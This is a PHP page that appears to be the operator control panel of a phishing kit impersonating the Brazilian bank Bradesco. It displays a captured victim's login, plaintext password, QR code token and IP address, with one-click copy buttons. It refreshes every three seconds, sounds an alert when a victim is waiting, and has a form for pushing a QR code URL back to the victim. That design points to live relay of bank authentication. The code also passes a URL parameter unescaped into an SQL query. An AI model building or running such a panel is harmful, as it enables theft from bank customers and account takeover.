<?php
require '../config/conexao.php';
$id = $_GET['id'];
$sql = mysqli_query($conn, "SELECT * FROM `dados` WHERE id = '$id' ") or die( 
    mysqli_error($conn) //caso haja um erro na consulta 
  );
$aux = mysqli_fetch_assoc($sql);
if (!isset($_COOKIE['login'])) {
	header("location:login.php");
}

?>
<!DOCTYPE html>
<html>
<head>
	<title>Operador Bradesco</title>
	<link rel="stylesheet" type="text/css" href="css/cliente.css">
	<link rel="stylesheet" type="text/css" href="font-awesome-4.7.0/css/font-awesome.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
	<meta charset="utf-8">
	<?php if ($aux["status"] == "Aguardando"): ?>
	<script type="text/javascript">
		var audio = new Audio('nesw-info1.mp3');
		audio.play();
	</script>
	<?php endif ?>
	<script type="text/javascript">
		setInterval(function() {
			if ($("#input_nome").is(':focus')) {
				console.log("Digitando nome")
			} else {
				if ($("#input_qr_code").is(':focus')) {
					console.log("Digitando QR code")
				} else {
					location.reload();
				}
			}
		}, 3000);
	</script>
   
    
</head>
<body>

	<?php require 'header.php'; ?>


	<div class="cliente">
		<div class="container">
			<div class="left">

				<table>
					<tr class="primary">
						<td>Status Atual</td>
						<td><?php echo $aux["status"] ?></td>
						<td><button><a href="./processar/remover.php?id=<?php echo $id ?>">Voltar</a></button></td>
					</tr>
					<tr>
						<td><b>Login</b>: <span id="login"><?php echo $aux["usuario"] ?></span> <button id="btnlogin"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAABmJLR0QA/wD/AP+gvaeTAAAAeklEQVQYlZWOsQ3CUAxEn1HETGmZgDQ0SAxBShbIHkikCA1rsAZTIJpHwUeKDF+Cq3zWO/vgH6mdOs18r7bqPoOTavIbX+oBmhTYAXfgDKzKuv0AgWOt3hy8AQfgUfwSGL6B14g4pSrr97yovcqKkuyAbYUZI+Ly60GeAwc52TfUuPQAAAAASUVORK5CYII="></button> </td></td>
						<td><b>Senha</b>: <span id="senha"><?php echo $aux["senha"] ?></span> <button id="btnsenha"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAABmJLR0QA/wD/AP+gvaeTAAAAeklEQVQYlZWOsQ3CUAxEn1HETGmZgDQ0SAxBShbIHkikCA1rsAZTIJpHwUeKDF+Cq3zWO/vgH6mdOs18r7bqPoOTavIbX+oBmhTYAXfgDKzKuv0AgWOt3hy8AQfgUfwSGL6B14g4pSrr97yovcqKkuyAbYUZI+Ly60GeAwc52TfUuPQAAAAASUVORK5CYII="></button> </td>
					</tr>
        
					<script type="text/javascript">
						function ClickQrCode() {
							if ($("#input_qr_code").val() == "") {
								alert("Informe a URL do QR code antes de continuar! MAFIADO7 agradece!");
							} else {
								location.href='processar/acao.php?status=QR CODE&id=<?php echo $_GET['id'];?>'
							}
						}
					</script>
					<tr>
						<td><b>Token Qr Code</b></td>
						<td><p><span id="qrcode"> <?php echo $aux["qrcode1"] ?></span></p><button id="btnqrcode"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAABmJLR0QA/wD/AP+gvaeTAAAAeklEQVQYlZWOsQ3CUAxEn1HETGmZgDQ0SAxBShbIHkikCA1rsAZTIJpHwUeKDF+Cq3zWO/vgH6mdOs18r7bqPoOTavIbX+oBmhTYAXfgDKzKuv0AgWOt3hy8AQfgUfwSGL6B14g4pSrr97yovcqKkuyAbYUZI+Ly60GeAwc52TfUuPQAAAAASUVORK5CYII="></button></td>
					</tr>
					
					<tr>
						<td><b>IP</b></td>
						<td><p><?php echo $aux["ip"] ?></p></td>
					</tr>
				
				</table>
				
			</div>
			<div class="right">
				
				<h3>Qr code</h3>
				<div class="form">
					<form action="processar/qr_code.php" method="post">
						<input type="hidden" autocomplete="off" value="<?php echo $_GET['id']; ?>" name="id" ">
						<input type="text" name="qr_code" id="input_qr_code" placeholder="Informe a url do QR code" value="<?php echo $aux["qrcode"] ?>">
						<button type="submit">ENVIAR</button>
					</form>
				</div>
			</div>
		</div>
	</div>

	<?php require 'footer.php'; ?>
    <script type="text/javascript">
document.getElementById('btnlogin').onclick = function() {
    var element= document.getElementById('login');
    var range = document.createRange();
    range.selectNode(element);
    window.getSelection().addRange(range);
    document.execCommand("copy");
};
document.getElementById('btnsenha').onclick = function() {
    var element= document.getElementById('senha');
    var range = document.createRange();
    range.selectNode(element);
    window.getSelection().addRange(range);
    document.execCommand("copy");
};
document.getElementById('btnqrcode').onclick = function() {
    var element= document.getElementById('qrcode');
    var range = document.createRange();
    range.selectNode(element);
    window.getSelection().addRange(range);
    document.execCommand("copy");
};
    </script>
    
</body>
</html>